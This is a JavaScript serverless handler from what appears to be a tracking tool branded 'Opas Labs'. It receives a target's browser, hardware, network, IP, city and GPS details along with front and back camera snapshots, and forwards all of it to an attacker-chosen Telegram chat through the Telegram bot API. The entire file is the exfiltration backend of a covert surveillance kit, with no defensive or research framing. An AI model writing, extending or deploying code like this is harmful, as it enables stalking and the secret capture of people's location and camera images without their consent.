export default async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { telegramId, ...d } = req.body;

    const message = `**🔰 Opas Labs 🔰**\n\n` +
    `🌐 **Basic Info:**\n` +
    `- Browser: ${d.browser}\n` +
    `- Platform: ${d.platform}\n` +
    `- Language: ${d.language}\n` +
    `- Timezone: ${d.timezone}\n\n` +

    `💻 **Hardware:**\n` +
    `- CPU: ${d.cpu}\n` +
    `- RAM: ${d.ram}\n` +
    `- Screen: ${d.screen}\n` +
    `- WebGL: ${d.webgl}\n\n` +

    `📶 **Network:**\n` +
    `- Type: ${d.networkType}\n` +
    `- Speed: ${d.networkSpeed}\n` +
    `- Downlink: ${d.downlink}\n` +
    `- Latency (RTT): ${d.latency}\n` +
    `- Data Saver: ${d.dataSaver}\n\n` +

    `📍 **Location & IP:**\n` +
    `- IP: ${d.ip}\n` +
    `- City: ${d.location.city}\n` +
    `- Region: ${d.location.region}\n` +
    `- Country: ${d.location.country}\n` +
    `- GPS: ${d.gps}\n\n` +

    `🔋 **Battery:**\n` +
    `- Level: ${d.batteryLevel}\n` +
    `- Charging: ${d.charging}\n\n` +

    `📷 **Camera Status:**\n` +
    `- ${d.cameraStatus}\n`;

    // Send images separately if they exist
    if (d.frontCameraImage) {
      await fetch(
        `https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendPhoto`,
        {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: telegramId,
            photo: d.frontCameraImage,
            caption: 'Front Camera Snapshot'
          })
        }
      );
    }

    if (d.backCameraImage) {
      await fetch(
        `https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendPhoto`,
        {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: telegramId,
            photo: d.backCameraImage,
            caption: 'Back Camera Snapshot'
          })
        }
      );
    }

    // Send the main message
    await fetch(
      `https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: telegramId,
          text: message,
          parse_mode: 'Markdown'
        })
      }
    );

    res.status(200).json({ success: true });
  } catch (error) {
    console.error('Submit Error:', error);
    res.status(500).json({ error: error.message || 'Failed to send to Telegram' });
  }
};
